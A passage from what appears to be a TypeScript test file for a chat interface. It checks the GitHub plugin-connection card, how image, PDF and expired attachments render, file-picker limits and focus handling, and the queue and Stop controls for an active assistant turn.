      decision: card({
        request_id: "config-3",
        kind: "config",
        name: "config",
        title: "Connect GitHub",
        proposal: {
          kind: "config",
          connect_plugin: { server_name: "github", reason: "Need issues" },
        },
      }),
    })]));

    expect(container.textContent).toContain("Connect");
    expect(container.textContent).toContain("github");
    const link = container.querySelector("a[href='/companions?view=plugins']");
    expect(link?.textContent).toContain("Finish this connection in Plugins");
  });
});

describe("Companion thread attachments", () => {
  it("shows an uploaded image inline and a document as a download, both in the message", () => {
    const container = mount(thread([
      entry({
        role: "user",
        event_id: "msg:1",
        content: "Look at these",
        author_id: "user-1",
        attachments: [
          attachment(),
          attachment({
            id: "7c1f0b52-8a2e-4c3d-9f10-0b1c2d3e4f51",
            content_type: "application/pdf",
            filename: "report.pdf",
            byte_size: 4096,
            position: 1,
          }),
        ],
      }),
    ]));

    const image = container.querySelector("img");
    // The bytes come from a route that re-authorizes on every request, not from a signed URL.
    expect(image?.getAttribute("src"))
      .toBe(`/v1/companions/${companionId}/attachments/7c1f0b52-8a2e-4c3d-9f10-0b1c2d3e4f50`);
    expect(image?.getAttribute("alt")).toBe("chart.png");
    const download = [...container.querySelectorAll("a[download]")]
      .find((link) => link.getAttribute("download") === "report.pdf");
    expect(download?.getAttribute("href"))
      .toBe(`/v1/companions/${companionId}/attachments/7c1f0b52-8a2e-4c3d-9f10-0b1c2d3e4f51`);
    expect(container.textContent).toContain("report.pdf");
  });

  it("renders an image Pi handed back inside the reply it belongs to", () => {
    const container = mount(thread([
      entry({
        role: "assistant",
        event_id: "v2:attempt:outputs",
        content: "",
        attachments: [attachment({ kind: "pi_output", filename: "plot.png" })],
      }),
    ]));

    expect(container.querySelector("img")?.getAttribute("alt")).toBe("plot.png");
  });

  it("keeps expired metadata in its message without a download or image request", () => {
    const container = mount(thread([
      entry({
        role: "user",
        event_id: "msg:expired",
        content: "Old report",
        author_id: "user-1",
        attachments: [attachment({
          availability: "expired",
          expires_at: "2026-09-01T12:00:00.000Z",
        })],
      }),
    ]));

    expect(container.querySelector("[data-slot=expired-attachment]")?.textContent)
      .toContain("chart.png");
    expect(container.querySelector("[data-slot=expired-attachment]")?.textContent)
      .toContain("Expired");
    expect(container.querySelector("[data-slot=companion-attachments] a")).toBeNull();
    expect(container.querySelector("[data-slot=companion-attachments] img")).toBeNull();
  });

  it("stages picked files as removable chips and refuses the ones it cannot send", () => {
    const container = mount(thread([]));
    const picker = container.querySelector("input[type=file]") as HTMLInputElement;

    act(() => {
      Object.defineProperty(picker, "files", {
        configurable: true,
        value: fileList([
          new File(["png"], "chart.png", { type: "image/png" }),
          new File(["zip"], "archive.zip", { type: "application/zip" }),
        ]),
      });
      picker.dispatchEvent(new Event("change", { bubbles: true }));
    });

    const chips = container.querySelector("[data-slot=composer-attachments]");
    expect(chips?.textContent).toContain("chart.png");
    expect(chips?.textContent ?? "").not.toContain("archive.zip");
    expect(container.querySelector("[data-slot=composer-attachment-error]")?.textContent ?? "")
      .toContain("archive.zip");

    const remove = [...container.querySelectorAll("button")]
      .find((button) => button.getAttribute("aria-label") === "Remove chart.png");
    click(remove!);
    expect(container.querySelector("[data-slot=composer-attachments]")).toBeNull();
  });

  it("says why Send is still disabled while only files are staged", () => {
    const container = mount(thread([]));
    const picker = container.querySelector("input[type=file]") as HTMLInputElement;

    act(() => {
      Object.defineProperty(picker, "files", {
        configurable: true,
        value: fileList([new File(["png"], "chart.png", { type: "image/png" })]),
      });
      picker.dispatchEvent(new Event("change", { bubbles: true }));
    });

    // A message must carry text, so a disabled Send needs to be an explained one.
    expect(container.querySelector("[data-slot=composer-hint]")?.textContent)
      .toContain("Add a message to send this file.");
  });

  it("keeps the attach control reachable and out of the tab order for the raw input", () => {
    const container = mount(thread([]));
    const picker = container.querySelector("input[type=file]") as HTMLInputElement;

    // A visually hidden but focusable input is a tab stop that opens an OS dialog on Enter.
    expect(picker.hidden).toBe(true);
    expect(container.querySelector("[data-slot=composer-attach]")).not.toBeNull();
  });

  it("keeps focus on the attach control after the last chip is removed", () => {
    const container = mount(thread([]));
    const picker = container.querySelector("input[type=file]") as HTMLInputElement;
    act(() => {
      Object.defineProperty(picker, "files", {
        configurable: true,
        value: fileList([new File(["png"], "chart.png", { type: "image/png" })]),
      });
      picker.dispatchEvent(new Event("change", { bubbles: true }));
    });

    const remove = [...container.querySelectorAll("button")]
      .find((button) => button.getAttribute("aria-label") === "Remove chart.png");
    click(remove!);

    // Removing the last chip unmounts the list; focus must not fall to the document body.
    expect(document.activeElement).toBe(container.querySelector("[data-slot=composer-attach]"));
  });

  it("restores focus to the attach control even when the composer was at capacity", () => {
    const container = mount(thread([]));
    const picker = container.querySelector("input[type=file]") as HTMLInputElement;
    const image = (name: string) => new File(["png"], name, { type: "image/png" });
    act(() => {
      Object.defineProperty(picker, "files", {
        configurable: true,
        value: fileList([image("a.png"), image("b.png"), image("c.png"), image("d.png"), image("e.png")]),
      });
      picker.dispatchEvent(new Event("change", { bubbles: true }));
    });
    // At capacity the attach control is disabled, so focusing it during the click would silently
    // fail and drop a keyboard reader onto the document body.
    const attach = container.querySelector<HTMLButtonElement>("[data-slot=composer-attach]")!;
    expect(attach.disabled).toBe(true);

    const remove = [...container.querySelectorAll("button")]
      .find((button) => button.getAttribute("aria-label") === "Remove a.png");
    click(remove!);

    expect(attach.disabled).toBe(false);
    expect(document.activeElement).toBe(attach);
  });

  it("announces a refused file rather than only showing it", () => {
    const container = mount(thread([]));
    const picker = container.querySelector("input[type=file]") as HTMLInputElement;
    act(() => {
      Object.defineProperty(picker, "files", {
        configurable: true,
        value: fileList([new File(["zip"], "archive.zip", { type: "application/zip" })]),
      });
      picker.dispatchEvent(new Event("change", { bubbles: true }));
    });

    expect(container.querySelector("[data-slot=composer-attachment-error]")?.getAttribute("role"))
      .toBe("alert");
  });

  it("names a file that has no stored bytes yet instead of rendering a broken image", () => {
    const container = mount(thread([
      entry({
        role: "user",
        event_id: "msg:pending",
        content: "Look at this",
        author_id: "user-1",
        attachments: [attachment({ id: "pending-1-0" })],
      }),
    ]));

    // A synthetic id is not a uuid, so the read route would 404 and the member would see the
    // browser's broken-image glyph on their own message until the next poll.
    expect(container.querySelector("[data-slot=companion-attachments] img")).toBeNull();
    expect(container.querySelector("[data-slot=companion-attachments]")?.textContent)
      .toContain("chart.png");
  });

  it("refuses a file larger than one message may carry", () => {
    const container = mount(thread([]));
    const picker = container.querySelector("input[type=file]") as HTMLInputElement;
    const oversized = new File(["x"], "huge.png", { type: "image/png" });
    Object.defineProperty(oversized, "size", { value: 11 * 1024 * 1024 });

    act(() => {
      Object.defineProperty(picker, "files", { configurable: true, value: fileList([oversized]) });
      picker.dispatchEvent(new Event("change", { bubbles: true }));
    });

    expect(container.querySelector("[data-slot=composer-attachments]")).toBeNull();
    expect(container.querySelector("[data-slot=composer-attachment-error]")?.textContent ?? "")
      .toContain("huge.png");
  });

  it("gives the files back to the composer when the send is refused", async () => {
    const container = mount(thread([]), undefined, async () => false);
    const picker = container.querySelector("input[type=file]") as HTMLInputElement;
    act(() => {
      Object.defineProperty(picker, "files", {
        configurable: true,
        value: fileList([new File(["png"], "chart.png", { type: "image/png" })]),
      });
      picker.dispatchEvent(new Event("change", { bubbles: true }));
    });

    const field = container.querySelector("textarea") as HTMLTextAreaElement;
    await act(async () => {
      field.value = "Look at this";
      field.dispatchEvent(new Event("input", { bubbles: true }));
    });
    await act(async () => {
      field.dispatchEvent(new KeyboardEvent("keydown", { key: "Enter", bubbles: true }));
    });

    // A refused send must not cost the member the files they picked.
    expect(container.querySelector("[data-slot=composer-attachments]")?.textContent)
      .toContain("chart.png");
  });
});

describe("queued follow-ups and stop", () => {
  it("labels a saved follow-up as queued and lets the runner remove it", async () => {
    const onCancelQueued = vi.fn(async () => {});
    const turnId = "22222222-2222-4222-8222-222222222222";
    const container = mount(
      thread([
        entry({ event_id: "msg:1", role: "user", content: "First", author_id: "user-1" }),
        entry({
          event_id: "msg:2",
          ordinal: 1,
          role: "user",
          content: "Then this",
          author_id: "user-1",
          queued: true,
          turn_id: turnId,
        }),
      ], { queued_count: 1, active_turn: activeTurn() }),
      undefined,
      async () => true,
      { onCancelQueued },
    );

    expect(container.querySelector("[data-slot=queued-message]")?.textContent).toContain("Queued");
    await act(async () => {
      (container.querySelector("[aria-label='Remove from queue']") as HTMLButtonElement).click();
    });
    expect(onCancelQueued).toHaveBeenCalledWith(turnId);
  });

  it("offers Stop while a turn is active and names the turn it cancels", async () => {
    const onStop = vi.fn(async () => {});
    const container = mount(
      thread([
        entry({ event_id: "msg:1", role: "user", content: "Draft it", author_id: "user-1" }),
      ], { active_turn: activeTurn() }),
      undefined,
      async () => true,
      { onStop },
    );

    const stop = container.querySelector("[data-slot=composer-stop]") as HTMLButtonElement;
    expect(stop).not.toBeNull();
    expect(container.querySelector("button[aria-label='Send message']")).not.toBeNull();
    await act(async () => stop.click());
    expect(onStop).toHaveBeenCalledWith("22222222-2222-4222-8222-222222222222");
  });
});
